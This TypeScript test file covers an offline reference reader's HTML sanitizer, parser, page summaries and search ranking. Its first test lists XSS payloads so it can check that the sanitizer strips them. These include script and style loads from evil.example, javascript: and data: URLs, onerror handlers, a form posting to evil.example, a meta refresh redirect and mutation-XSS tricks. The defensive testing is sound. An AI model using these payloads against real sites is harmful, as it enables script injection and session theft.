import { test } from "node:test";
import assert from "node:assert/strict";
import { cleanPage, pageSummary, articleText, resolveInBook, externalHref, refId, readerHref } from "../src/reference/sanitize.js";
import { parseHtml, decodeEntities } from "../src/reference/html.js";
import { pageForAssistant, plainSnippet, questionWords } from "../src/reference/assistant.js";
import { fold, isLanguageCopy, rankResults, AnswerCache } from "../src/reference/search.js";

const opts = { book: "archlinux_en_all", path: "Systemd/User", images: true, urlName: "archlinux_en_all_maxi_2026-10" };
const clean = (body: string, o: Partial<typeof opts> = {}) => cleanPage(`<html><body>${body}</body></html>`, { ...opts, ...o }).html;

/** Nothing that runs, loads or submits is left, whatever the markup tried. */
function assertInert(html: string): void {
  assert.doesNotMatch(html, /<(script|style|iframe|frame|object|embed|form|input|button|textarea|select|svg|math|base|link|meta|noscript|template)\b/i, html);
  assert.doesNotMatch(html, /\son[a-z]+\s*=/i, html);
  assert.doesNotMatch(html, /javascript:|vbscript:|data:/i, html);
  assert.doesNotMatch(html, /\s(style|class|src|srcset|action|formaction|xlink:href|name)\s*=/i, html);
  // Every tag that is written is one of the kept ones.
  for (const m of html.matchAll(/<\/?([a-zA-Z][a-zA-Z0-9-]*)/g)) assert.match(m[1], /^(a|abbr|b|bdi|bdo|br|cite|code|data|dfn|em|i|kbd|mark|q|rp|rt|ruby|s|samp|small|span|strong|sub|sup|time|u|var|wbr|del|ins|address|article|aside|blockquote|details|div|footer|header|h[1-6]|hgroup|hr|p|pre|section|summary|dl|dt|dd|ol|ul|li|table|caption|colgroup|col|thead|tbody|tfoot|tr|th|td|figure|figcaption|img)$/, `kept tag ${m[1]}`);
}

test("reference sanitizer: scripts, styles, frames, forms, objects, handlers and script addresses never survive", () => {
  const hostile = [
    `<script>alert(1)</script><p>a</p>`,
    `<SCRIPT SRC=//evil.example/x.js></SCRIPT><p>b</p>`,
    `<p onclick="alert(1)" onmouseover=alert(1) style="position:fixed;top:0" class="x">c</p>`,
    `<a href="javascript:alert(1)">1</a><a href=" JaVaScRiPt:alert(1)">2</a><a href="java&#x09;script:alert(1)">3</a><a href="&#106;avascript:alert(1)">4</a>`,
    `<a href="vbscript:msgbox(1)">5</a><a href="data:text/html;base64,PHNjcmlwdD4=">6</a><a href="file:///etc/passwd">7</a>`,
    `<img src="x" onerror="alert(1)"><img src="data:image/png;base64,AAAA"><img srcset="a.png 1x">`,
    `<svg><script>alert(1)</script><a xlink:href="javascript:alert(1)">s</a><foreignObject><p>in svg</p></foreignObject></svg>`,
    `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`,
    `<iframe src="https://evil.example/" srcdoc="<script>alert(1)</script>"></iframe><frameset><frame src="x"></frameset>`,
    `<object data="x.swf"><param name="x" value="y"></object><embed src="x.swf"><applet code="x"></applet>`,
    `<form action="https://evil.example/"><input name="q" autofocus onfocus="alert(1)"><button formaction="javascript:alert(1)">go</button><textarea>t</textarea><select><option>o</option></select></form>`,
    `<style>@import url(https://evil.example/x.css); p{background:url(javascript:alert(1))}</style><link rel="stylesheet" href="https://evil.example/x.css">`,
    `<base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example/">`,
    `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
    `<template><script>alert(1)</script></template><xmp><script>alert(1)</script></xmp>`,
    `<div><<script>script>alert(1)<</script>/script></div>`,
    `<a href="x"><b>nested <a href="javascript:alert(1)">inner</a></b></a>`,
    `<table><tr><td background="javascript:alert(1)" colspan="2x">x</td></tr></table>`,
    `<details open ontoggle="alert(1)"><summary>s</summary>d</details>`,
    `<p>unclosed <b>bold <i>italic</p><div>after`,
    `<!-- <script>alert(1)</script> --><p>comment</p><![CDATA[<script>alert(1)</script>]]>`,
    `<img src="https://tracker.example/pixel.gif" alt="t">`,
    `<a href="//evil.example/x" onclick="x">protocol relative</a>`,
  ];
  for (const h of hostile) {
    const out = clean(h);
    assertInert(out);
  }
  // What is meant as text stays text, escaped.
  assert.match(clean(`<div><<script>script>alert(1)<</script>/script></div>`), /&lt;/);
  assert.equal(clean(`<p>a &lt; b &amp;&amp; c &gt; d</p>`), "<p>a &lt; b &amp;&amp; c &gt; d</p>");
  // Hidden parts and page furniture go; visible text around them stays.
  assert.equal(clean(`<p>keep<span style="display:none">gone</span><span hidden>gone</span><span class="mw-editsection">[edit]</span></p>`), "<p>keep</p>");
  // Nesting a hundred thousand deep is flattened, not a crash.
  assertInert(clean(`${"<div>".repeat(100_000)}deep<script>alert(1)</script>`));
});

test("reference sanitizer: links inside the book open in the reader, others keep their https address", () => {
  const html = clean(`<p><a href="../Systemd" title="Systemd">s</a> <a href="Timers#Monotonic">t</a> <a href="#Automatic_start-up">up</a> <a href="https://man.archlinux.org/man/x.7#UNITS">man</a> <a href="http://plain.example.org/a?b=1&amp;c=2">plain</a> <a href="mailto:x@example.org">mail</a> <a href="/content/archlinux_en_all_maxi_2026-10/Kernel">abs</a> <a href="/content/other_book/Kernel">other</a> <a href="../_res_/logo.png">pic link</a></p>`);
  assert.match(html, /<a title="Systemd" href="#\/reference\/archlinux_en_all\/Systemd" data-book="archlinux_en_all" data-path="Systemd">s<\/a>/);
  assert.match(html, /<a href="#\/reference\/archlinux_en_all\/Systemd%2FTimers" data-book="archlinux_en_all" data-path="Systemd\/Timers" data-fragment="ref-Monotonic">t<\/a>/);
  assert.match(html, /<a href="#\/reference\/archlinux_en_all\/Systemd%2FUser" data-book="archlinux_en_all" data-path="Systemd\/User" data-fragment="ref-Automatic_start-up">up<\/a>/);
  assert.match(html, /<a href="https:\/\/man\.archlinux\.org\/man\/x\.7#UNITS" rel="noopener noreferrer" data-external="">man<\/a>/);
  assert.match(html, /<a href="https:\/\/plain\.example\.org\/a\?b=1&amp;c=2" rel="noopener noreferrer" data-external="">plain<\/a>/, "plain http is asked for over https");
  assert.match(html, / mail /, "another scheme keeps only its text");
  assert.match(html, /data-path="Kernel">abs<\/a>/, "the reader's own address for this book");
  assert.match(html, /<\/a> other pic link<\/p>/, "another book's address, and a link to a picture file, keep only what they hold");
  assert.equal(readerHref("b", "a/b c?"), "#/reference/b/a%2Fb%20c%3F");
  assert.deepEqual(resolveInBook("../Bluetooth_(%D0%A0%D1%83%D1%81%D1%81%D0%BA%D0%B8%D0%B9)", "Systemd/User"), { path: "Bluetooth_(Русский)", fragment: null });
  assert.equal(resolveInBook("https://elsewhere.example/x", "A"), null);
  assert.equal(externalHref("https://user:pw@example.org/"), null);
  assert.equal(externalHref("ftp://example.org/"), null);
});

test("reference sanitizer: pictures by their path in the book, loaded by the device; none for a book without", () => {
  const body = `<figure><a href="../File:Logo.png"><img src="../_res_/logo.png" alt="Logo" width="120" height="40px" srcset="x 2x" onerror="x"></a><figcaption>The logo</figcaption></figure><img data-src="./lazy.webp" alt="lazy"><img src="../_res_/doc.pdf"><img src="https://cdn.example/x.png">`;
  const html = clean(body);
  assert.match(html, /<img alt="Logo" width="120" data-media="_res_\/logo\.png">/, "no src; a height that is not a number is left out");
  assert.match(html, /<img alt="lazy" data-media="Systemd\/lazy\.webp">/);
  assert.equal((html.match(/<img/g) ?? []).length, 2, "a PDF and another site's picture are left out");
  assert.match(html, /<figcaption>The logo<\/figcaption>/);
  const none = clean(body, { images: false });
  assert.doesNotMatch(none, /<img/);
  assert.match(none, /The logo/);
});

test("reference sanitizer: every heading has an id, the table of contents lists h2 and h3, details open", () => {
  const page = cleanPage(`<html><head><title>Bluetooth headset</title><link rel="canonical" href="https://wiki.archlinux.org/title/Bluetooth_headset"></head><body><h1>Bluetooth headset</h1><div id="mw-content-text">
    <p id="top">Lead.</p>
    <div class="mw-heading mw-heading2"><h2 id="Headset_via_PipeWire">Headset via <em>PipeWire</em><span class="mw-editsection">[edit]</span></h2></div>
    <h3><span class="mw-headline" id="Troubleshooting">Troubleshooting</span></h3>
    <h4>Deep</h4>
    <h2>Notes &amp; links</h2><h2>Notes &amp; links</h2>
    <details><summary>More</summary><p>inside</p></details>
    <h2 id="root">Root</h2>
  </div><div class="footer">outside the article</div></body></html>`, opts);
  assert.equal(page.title, "Bluetooth headset");
  assert.equal(page.url, "https://wiki.archlinux.org/title/Bluetooth_headset");
  assert.deepEqual(page.toc, [
    { level: 2, id: "ref-Headset_via_PipeWire", text: "Headset via PipeWire" },
    { level: 3, id: "ref-Troubleshooting", text: "Troubleshooting" },
    { level: 2, id: "ref-Notes_links", text: "Notes & links" },
    { level: 2, id: "ref-Notes_links-2", text: "Notes & links" },
    { level: 2, id: "ref-root", text: "Root" },
  ]);
  assert.match(page.html, /<h4 id="ref-Deep">Deep<\/h4>/);
  assert.match(page.html, /<h3 id="ref-Troubleshooting">Troubleshooting<\/h3>/, "the span's id moves to the heading, once");
  assert.match(page.html, /<details open="">/);
  assert.match(page.html, /<p id="ref-top">Lead\.<\/p>/, "other ids are kept, prefixed, so the app's own never clash");
  assert.doesNotMatch(page.html, /outside the article|\[edit\]/);
  assert.equal(refId("a b/c\"d"), "ref-a_b_c_d");
});

test("reference summary and plain text: the first real paragraph, the first picture, sections for the assistant", () => {
  const raw = `<html><head><title>Paris</title></head><body><div id="mw-content-text">
    <table class="infobox"><tr><td><p>Infobox text that is long enough to count as a paragraph of its own.</p><img src="./flag.png" width="20"></td></tr></table>
    <p>Short.</p>
    <p>Paris is the capital and largest city of France.<sup class="reference"><a href="#cite_note-1">[1]</a></sup> It has about two million people in the city itself.</p>
    <img src="./icon.png" width="16"><figure><img src="./Paris.jpg" width="300"></figure>
    <h2 id="History">History</h2><p>The Parisii lived here.</p><ul><li>Roman times</li><li>Middle Ages</li></ul>
    <h2 id="Transport">Transport</h2><p>The metro has 16 lines.</p><table><tr><th>Line</th><td>1</td></tr></table>
  </div></body></html>`;
  const s = pageSummary(raw, { book: "wikipedia_en_all", path: "Paris", images: true });
  assert.deepEqual(s, { title: "Paris", text: "Paris is the capital and largest city of France. It has about two million people in the city itself.", media: "Paris.jpg" });
  assert.equal(pageSummary(raw, { book: "wikipedia_en_all", path: "Paris", images: false }).media, null);
  const long = pageSummary(`<p>${"word ".repeat(300)}</p>`, { book: "b", path: "p", images: false });
  assert.ok(long.text.length <= 600 && long.text.endsWith("…"));
  const page = cleanPage(raw, { book: "wikipedia_en_all", path: "Paris", images: true });
  const art = articleText(page.html);
  assert.match(art.lead, /Paris is the capital/);
  assert.deepEqual(art.sections.map((x) => [x.id, x.title]), [["ref-History", "History"], ["ref-Transport", "Transport"]]);
  assert.match(art.sections[0].text, /- Roman times\n- Middle Ages/);
  assert.match(art.sections[1].text, /Line \| 1/);
  // For the assistant: the start and the section that fits the question, or the one named.
  const forMetro = pageForAssistant(page.html, "how many metro lines does Paris have?");
  assert.match(forMetro, /Paris is the capital[\s\S]*## Transport\nThe metro has 16 lines/);
  assert.doesNotMatch(forMetro, /The Parisii lived here/);
  assert.match(forMetro, /\(Sections: History\)/);
  assert.match(pageForAssistant(page.html, "anything", "history"), /## History\nThe Parisii lived here/);
  assert.ok(pageForAssistant(`<p>${"x".repeat(20_000)}</p><h2>A</h2><p>${"y".repeat(20_000)}</p>`, "a").length <= 6000);
  assert.deepEqual(questionWords("How do I fix the Bluetooth headset volume?"), ["fix", "bluetooth", "headset", "volume"]);
  assert.equal(plainSnippet("a <b>Bluetooth</b> &amp; b"), "a Bluetooth & b");
});

test("reference parser: entities, attributes and raw text the way a browser reads them", () => {
  assert.equal(decodeEntities("&amp;&lt;&gt;&quot;&#39;&#x41;&#65;&copy;&copy2&notin;&#0;&#x110000;&bogus;"), "&<>\"'AA©©2∉��&bogus;");
  assert.equal(decodeEntities("?a=1&copy=2", true), "?a=1&copy=2", "in an attribute a legacy name before = stays");
  const doc = parseHtml(`<A HREF=x TITLE='q' title="second" data-x>y</A><p>1<p>2<ul><li>a<li>b</ul><table><tr><td>c<td>d</table>`);
  const a = doc.children[0] as { name: string; attrs: Map<string, string> };
  assert.equal(a.name, "a");
  assert.deepEqual([...a.attrs], [["href", "x"], ["title", "q"], ["data-x", ""]], "lower case names; the first of two wins");
  assert.deepEqual(doc.children.map((c) => (c.type === "element" ? c.name : "#text")), ["a", "p", "p", "ul", "table"]);
});

test("reference search order: the title asked for first, then titles that start with it, then full text; copies in other languages last", () => {
  const en = { name: "archlinux_en_all", source: "archwiki", lang: "eng", langs: ["eng"] };
  const es = { name: "wikipedia_es_all", source: "wikipedia", lang: "spa", langs: ["spa"] };
  const hits = rankResults("bluetooth headset", [
    {
      book: en,
      titles: [{ title: "Bluetooth Headset", path: "Bluetooth_Headset" }, { title: "Bluetooth headset (Русский)", path: "Bluetooth_headset_(Русский)" }, { title: "Bluetooth headsets for gaming", path: "Gaming_headsets" }],
      texts: [
        { title: "Bluetooth headset (Русский)", path: "Bluetooth_headset_(Русский)", snippet: [{ bold: "Bluetooth" }, { text: " перевод" }], words: 3480 },
        { title: "Bluetooth headset", path: "Bluetooth_headset", snippet: [{ bold: "Bluetooth" }, { text: " " }, { bold: "headset" }, { text: " <b>escaped</b> & more" }], words: 4576 },
        { title: "Blueman", path: "Blueman", snippet: [{ text: "a " }, { bold: "Bluetooth" }, { text: " manager" }], words: 727 },
      ],
    },
    { book: es, titles: [{ title: "Bluetooth headset", path: "Auriculares" }], texts: [{ title: "Auriculares Bluetooth", path: "Auriculares_Bluetooth", snippet: [{ text: "x" }], words: null }] },
  ], "eng");
  assert.deepEqual(hits.map((h) => `${h.book}:${h.title}:${h.kind}`), [
    "archlinux_en_all:Bluetooth headset:title",
    "wikipedia_es_all:Bluetooth headset:title",
    "archlinux_en_all:Bluetooth headsets for gaming:title",
    "archlinux_en_all:Blueman:text",
    "wikipedia_es_all:Auriculares Bluetooth:text",
    "archlinux_en_all:Bluetooth headset (Русский):title",
  ]);
  // The redirect's title takes the real page and its snippet; snippets keep only <b>.
  assert.equal(hits[0].path, "Bluetooth_headset");
  assert.equal(hits[0].words, 4576);
  assert.equal(hits[0].snippet, "<b>Bluetooth</b> <b>headset</b> &lt;b&gt;escaped&lt;/b&gt; &amp; more");
  assert.ok(isLanguageCopy("Mirrors (Magyar)") && isLanguageCopy("Bluetooth (Español)") && !isLanguageCopy("Python (programming language)") && !isLanguageCopy("Mercury (Latin)"));
  // In a book written in the Latin alphabet, a word in another script marks another language's page, whatever its end.
  assert.ok(isLanguageCopy("Bluetooth клавиатура", ["eng"]) && isLanguageCopy("Bluetooth мышь", ["eng"]) && isLanguageCopy("蓝牙 耳机", ["eng"]) && isLanguageCopy("ブルートゥース", ["eng"]));
  assert.ok(!isLanguageCopy("Bluetooth headset", ["eng"]) && !isLanguageCopy("λ calculus", ["eng"]) && !isLanguageCopy("Ω (unit)", ["eng"]), "one letter of another script is not a word");
  assert.ok(!isLanguageCopy("Bluetooth клавиатура", ["rus"]) && !isLanguageCopy("Bluetooth клавиатура", ["eng", "rus"]), "a Cyrillic title is at home in a Russian book");
  assert.equal(fold("  Ça_va  BIEN "), "ca va bien");
  const cache = new AnswerCache<number>(2, 1000);
  cache.set("a", 1, 0); cache.set("b", 2, 0); cache.get("a", 10); cache.set("c", 3, 10);
  assert.deepEqual([cache.get("a", 20), cache.get("b", 20), cache.get("c", 20), cache.get("c", 2000)], [1, undefined, 3, undefined], "the least recent goes first; old answers expire");
});
